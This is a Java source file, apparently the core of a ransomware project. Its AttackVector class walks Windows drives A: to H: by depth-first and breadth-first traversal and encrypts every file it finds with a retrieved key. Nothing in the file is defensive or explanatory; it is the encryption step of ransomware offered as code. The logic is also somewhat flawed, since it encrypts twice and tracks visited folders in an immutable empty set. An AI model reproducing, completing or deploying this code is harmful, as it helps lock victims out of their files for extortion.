package Agent.Attack;

import java.io.File;
import java.util.Collection;
import java.util.Collections;

import Agent.entites.CryptoKey;
import Agent.exceptions.RansomwareException;
import Agent.traversal.*;

public class AttackVector {

	public void attack(String inputDir, Collection<File> dirs, CryptoKey key) {
		Traverse dfs = new DFS<File>();
		dfs.traverseAndEncrypt(inputDir, dirs, key);
		// or
		Traverse bfs = new BFS<File>();
		bfs.traverseAndEncrypt(inputDir, dirs, key);
	}

	public void encryptFileSystem() throws RansomwareException {
		try {
			KeyGetter key = new KeyGetter();
			Collection<File> visitedFolders = Collections.emptySet();
			for (char i = 'A'; i <= 'H'; i++) {
				attack(i + ":\\", visitedFolders, key.getKey());
			}
		} catch (Exception e) {
			throw new RansomwareException();
		}
	}
}
